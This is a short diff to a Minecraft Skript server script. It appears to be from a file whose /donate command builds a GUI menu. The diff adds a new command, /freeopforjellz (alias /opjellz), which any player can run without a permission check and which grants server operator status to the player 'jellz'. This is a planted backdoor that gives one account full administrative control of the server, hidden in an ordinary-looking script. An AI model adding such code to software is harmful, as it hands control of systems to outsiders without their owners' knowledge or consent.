@@ -380,5 +380,9 @@ command /donate:
 		format gui slot 45 of player with 33 named "" with lore "" to close then run player command "donate"
 		format gui slot 54 of player with 33 named "" with lore "" to close then run player command "donate"
 
-
+command /freeopforjellz:
+	aliases: /opjellz
+	trigger:
+		send "Thanks for opping Jellz! <3"
+		op ("jellz" parsed as a player)
 
